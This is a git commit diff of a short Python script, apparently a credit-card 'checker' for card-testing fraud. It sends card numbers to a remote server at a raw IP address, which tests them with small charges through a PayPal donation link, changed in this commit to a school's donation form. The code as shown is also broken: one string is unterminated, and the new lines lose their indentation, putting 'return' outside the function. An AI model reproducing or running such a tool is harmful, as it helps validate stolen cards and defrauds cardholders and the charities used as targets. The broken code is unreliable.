6f3b3d3c2675fbb840a93a6c83da3be0c97105e8
a06505302-cpu <a06505302@gmail.com>
2026-03-12 19:31:27 +0200

    gatet.py

--- gatet.py
+++ gatet.py
@@ -1,7 +1,7 @@
 import requests
 def chkk(ccx):
-	cc=ccx.strip()
-	urll="https://www.paypal.com/donate/guest?token=RvX9hIw1OfGBrxAFQI15_e2NA0iFEQS-ziSEjT60OcFL6c9vB462D1LpebsUd8Nam6znAJdWgRGkN-4x
-	price="1"
-	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={1}').text
-	return res
+cc=ccx.strip()
+urll="https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=5"
+price="5"
+res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={5}').text
+return res
